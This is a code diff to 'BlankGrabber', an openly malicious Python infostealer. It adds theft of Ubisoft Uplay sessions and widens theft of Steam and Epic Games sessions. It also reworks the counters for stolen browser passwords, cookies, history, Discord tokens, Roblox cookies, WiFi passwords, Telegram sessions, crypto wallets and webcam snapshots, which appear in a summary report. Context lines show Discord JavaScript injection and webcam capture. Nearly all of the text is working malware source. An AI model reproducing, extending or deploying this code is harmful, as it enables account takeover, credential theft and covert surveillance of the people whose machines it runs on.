@@ -883,20 +883,21 @@ class BlankGrabber:
     ArchivePath: str = None # Path of the archive to be made after all the data is collected
 
     Cookies: list = [] # List of cookies collected
-    Passwords: list = [] # List of passwords collected
-    History: list = [] # List of history collected
-    RobloxCookies: list = [] # List of Roblox cookies collected
-    DiscordTokens: list = [] # List of Discord tokens collected
-    WifiPasswords: list = [] # List of WiFi passwords collected
+    PasswordsCount: int = 0 # Number of passwords collected
+    HistoryCount: int = 0 # Number of history collected
+    RobloxCookiesCount: int = 0 # Number of Roblox cookies collected
+    DiscordTokensCount: int = 0 # Number of Discord tokens collected
+    WifiPasswordsCount: int = 0 # Number of WiFi passwords collected
+    MinecraftSessions: int = 0 # Number of Minecraft session files collected
+    WebcamPicturesCount: int = 0 # Number of webcam snapshots collected
+    TelegramSessionsCount: int = 0 # Number of Telegram sessions collected
+    CommonFilesCount: int = 0 # Number of files collected
+    WalletsCount: int = 0 # Number of different crypto wallets collected
     Screenshot: bool = False # Indicates whether screenshot was collected or not
     SystemInfo: bool = False # Indicates whether system info was collected or not
-    MinecraftSessions: int = 0 # Number of Minecraft session files collected
-    WebcamPictures: int = 0 # Number of webcam snapshots collected
-    TelegramSessions: int = 0 # Number of Telegram sessions collected
-    CommonFiles: int = 0 # Number of files collected
-    WalletsCount: int = 0 # Number of different crypto wallets collected
-    SteamCount: int = 0 # Number of steam accounts collected
-    EpicCount: int = 0 # Number of epic accounts collected
+    SteamStolen: bool = False # Indicates whether Steam account was stolen or not
+    EpicStolen: bool = False # Indicates whether Epic Games account was stolen or not
+    UplayStolen: bool = False # Indicates whether Uplay account was stolen or not
 
     def __init__(self) -> None: # Constructor to call all the functions
         self.Separator = "\n\n" + "Blank Grabber".center(50, "=") + "\n\n" # Sets the value of the separator
@@ -921,6 +922,7 @@ class BlankGrabber:
             (self.StealMinecraft, False),
             (self.StealEpic, False),
             (self.StealSteam, False),
+            (self.StealUplay, False),
             (self.GetAntivirus, False),
             (self.GetClipboard, False),
             (self.GetTaskList, False),
@@ -972,7 +974,7 @@ class BlankGrabber:
                                 try:
                                     os.makedirs(os.path.join(self.TempFolder, "Common Files", name), exist_ok= True)
                                     shutil.copy(os.path.join(dir, file), os.path.join(self.TempFolder, "Common Files", name, file))
-                                    self.CommonFiles += 1
+                                    self.CommonFilesCount += 1
                                 except Exception:
                                     pass
 
@@ -1023,8 +1025,11 @@ class BlankGrabber:
                     if "[RememberMe]" in contents:
                         try:
                             os.makedirs(saveToPath, exist_ok= True)
+                            for file in os.listdir(epicPath):
+                                if os.path.isfile(os.path.join(epicPath, file)):
+                                    shutil.copy(os.path.join(epicPath, file), os.path.join(saveToPath, file))
                             shutil.copytree(epicPath, saveToPath, dirs_exist_ok= True)
-                            self.EpicCount += 1
+                            self.EpicStolen = True
                         except Exception:
                             pass
     
@@ -1033,19 +1038,35 @@ class BlankGrabber:
         if Settings.CaptureGames:
             Logger.info("Stealing Steam session")
             saveToPath = os.path.join(self.TempFolder, "Games", "Steam")
-            steamPath = os.path.join("C:\\", "Program Files (x86)", "Steam", "config")
-            if os.path.isdir(steamPath):
-                loginFile = os.path.join(steamPath, "loginusers.vdf")
+            steamPath = os.path.join("C:\\", "Program Files (x86)", "Steam")
+            steamConfigPath = os.path.join(steamPath, "config")
+            if os.path.isdir(steamConfigPath):
+                loginFile = os.path.join(steamConfigPath, "loginusers.vdf")
                 if os.path.isfile(loginFile):
                     with open(loginFile) as file:
                         contents = file.read()
                     if '"RememberPassword"\t\t"1"' in contents:
                         try:
                             os.makedirs(saveToPath, exist_ok= True)
-                            shutil.copytree(steamPath, saveToPath, dirs_exist_ok= True)
-                            self.SteamCount += 1
+                            shutil.copytree(steamConfigPath, os.path.join(saveToPath, "config"), dirs_exist_ok= True)
+                            for item in os.listdir(steamPath):
+                                if item.startswith("ssfn") and os.path.isfile(os.path.join(steamPath, item)):
+                                    shutil.copy(os.path.join(steamPath, item), os.path.join(saveToPath, item))
+                                    self.SteamStolen = True
                         except Exception:
                             pass
+    
+    @Errors.Catch
+    def StealUplay(self) -> None: # Steals Uplay accounts
+        if Settings.CaptureGames:
+            Logger.info("Stealing Uplay session")
+            saveToPath = os.path.join(self.TempFolder, "Games", "Uplay")
+            uplayPath = os.path.join(os.getenv("localappdata"), "Ubisoft Game Launcher")
+            if os.path.isdir(uplayPath):
+                for item in os.listdir(uplayPath):
+                    if os.path.isfile(os.path.join(uplayPath, item)):
+                        shutil.copy(os.path.join(uplayPath, item), os.path.join(saveToPath, item))
+                        self.UplayStolen = True
     
     @Errors.Catch
     def StealRobloxCookies(self) -> None: # Steals Roblox cookies
@@ -1053,10 +1074,11 @@ class BlankGrabber:
             Logger.info("Stealing Roblox cookies")
             saveToDir = os.path.join(self.TempFolder, "Games", "Roblox")
             note = "# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not."
+            cookies = []
 
             browserCookies = "\n".join(self.Cookies)
             for match in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", browserCookies):
-                self.RobloxCookies.append(match)
+                cookies.append(match)
         
             output = list()
             for item in ('HKCU', 'HKLM'):
@@ -1065,14 +1087,15 @@ class BlankGrabber:
                     output.append(process.stdout.decode(errors= "ignore"))
         
             for match in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", "\n".join(output)):
-                self.RobloxCookies.append(match)
+                cookies.append(match)
         
-            self.RobloxCookies = [*set(self.RobloxCookies)] # Removes duplicates
+            cookies = [*set(cookies)] # Removes duplicates
 
-            if(self.RobloxCookies):
+            if cookies:
                 os.makedirs(saveToDir, exist_ok= True)
                 with open(os.path.join(saveToDir, "Roblox Cookies.txt"), "w") as file:
-                    file.write("{}{}{}".format(note, self.Separator, self.Separator.join(self.RobloxCookies)))
+                    file.write("{}{}{}".format(note, self.Separator, self.Separator.join(cookies)))
+                self.RobloxCookiesCount += len(cookies)
     
     @Errors.Catch
     def StealWallets(self) -> None: # Steals crypto wallets
@@ -1249,7 +1272,7 @@ class BlankGrabber:
                 os.makedirs(saveToDir, exist_ok= True)
                 with open(os.path.join(saveToDir, "Wifi Networks.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                     file.write(self.Separator.lstrip() + self.Separator.join(profiles))
-                self.WifiPasswords.extend(profiles)
+                self.WifiPasswordsCount += len(profiles)
     
     @Errors.Catch
     def TakeScreenshot(self) -> None: # Takes screenshot(s) of all the monitors of the system
@@ -1310,7 +1333,7 @@ class BlankGrabber:
                                 output = ["URL: {}\nUsername: {}\nPassword: {}".format(*x) for x in passwords]
                                 with open(os.path.join(saveToDir, "{} Passwords.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
                                     file.write(self.Separator.lstrip() + self.Separator.join(output))
-                                self.Passwords.extend(passwords)
+                                self.PasswordsCount += len(passwords)
                             
                             if cookies:
                                 output = ["{}\t{}\t{}\t{}\t{}\t{}\t{}".format(host, str(expiry != 0).upper(), cpath, str(not host.startswith(".")).upper(), expiry, cname, cookie) for host, cname, cpath, cookie, expiry in cookies]
@@ -1323,7 +1346,7 @@ class BlankGrabber:
                                 output = ["URL: {}\nTitle: {}\nVisits: {}".format(*x) for x in history]
                                 with open(os.path.join(saveToDir, "{} History.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
                                     file.write(self.Separator.lstrip() + self.Separator.join(output))
-                                self.History.extend(history)
+                                self.HistoryCount += len(history)
 
                     except Exception:
                         pass
@@ -1345,11 +1368,11 @@ class BlankGrabber:
             os.makedirs(camdir, exist_ok= True)
 
             camIndex = 0
-            while Syscalls.CaptureWebcam(camIndex, os.path.join(camdir, "Webcam %d.bmp" % (camIndex + 1))):
+            while Syscalls.CaptureWebcam(camIndex, os.path.join(camdir, "Webcam (%d).bmp" % (camIndex + 1))):
                 camIndex += 1
-                self.WebcamPictures += 1
+                self.WebcamPicturesCount += 1
             
-            if self.WebcamPictures == 0:
+            if self.WebcamPicturesCount == 0:
                 shutil.rmtree(camdir)
     
     @Errors.Catch
@@ -1408,7 +1431,7 @@ class BlankGrabber:
                         shutil.rmtree(saveToDir)
                         return
                 
-                self.TelegramSessions += int((len(loginPaths) - 1)/2)
+                self.TelegramSessionsCount += int((len(loginPaths) - 1)/2)
     
     @Errors.Catch
     def StealDiscordTokens(self) -> None: # Steals Discord tokens
@@ -1425,7 +1448,7 @@ class BlankGrabber:
                 os.makedirs(os.path.join(self.TempFolder, "Messenger", "Discord"), exist_ok= True)
                 with open(os.path.join(saveToDir, "Discord Tokens.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                     file.write(self.Separator.lstrip() + self.Separator.join(output))
-                self.DiscordTokens.extend(accounts)
+                self.DiscordTokensCount += len(accounts)
         
         if Settings.DiscordInjection and not Utility.IsInStartup():
             paths = Discord.InjectJs()
@@ -1517,21 +1540,22 @@ class BlankGrabber:
             system_info = f"Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}"
 
             collection = {
-                            "Discord Accounts" : len(self.DiscordTokens),
-                            "Passwords" : len(self.Passwords),
+                            "Discord Accounts" : self.DiscordTokensCount,
+                            "Passwords" : self.PasswordsCount,
                             "Cookies" : len(self.Cookies),
-                            "History" : len(self.History),
-                            "Roblox Cookies" : len(self.RobloxCookies),
-                            "Telegram Sessions" : self.TelegramSessions,
-                            "Common Files" : self.CommonFiles,
+                            "History" : self.HistoryCount,
+                            "Roblox Cookies" : self.RobloxCookiesCount,
+                            "Telegram Sessions" : self.TelegramSessionsCount,
+                            "Common Files" : self.CommonFilesCount,
                             "Wallets" : self.WalletsCount,
-                            "Wifi Passwords" : len(self.WifiPasswords),
+                            "Wifi Passwords" : self.WifiPasswordsCount,
+                            "Webcam" : self.WebcamPicturesCount,
                             "Minecraft Sessions" : self.MinecraftSessions,
-                            "Epic Sessions" : self.EpicCount,
-                            "Steam Sessions" : self.SteamCount,
-                            "Screenshot" : self.Screenshot,
-                            "System Info" : self.SystemInfo,
-                            "Webcam" : self.WebcamPictures
+                            "Epic Session" : "Yes" if self.EpicStolen else "No",
+                            "Steam Session" : "Yes" if self.SteamStolen else "No",
+                            "Uplay Session" : "Yes" if self.UplayStolen else "No",
+                            "Screenshot" : "Yes" if self.Screenshot else "No",
+                            "System Info" : "Yes" if self.SystemInfo else "No",
             }
             
             grabbedInfo = "\n".join([key.ljust(20) + " : " + str(value) for key, value in collection.items()])
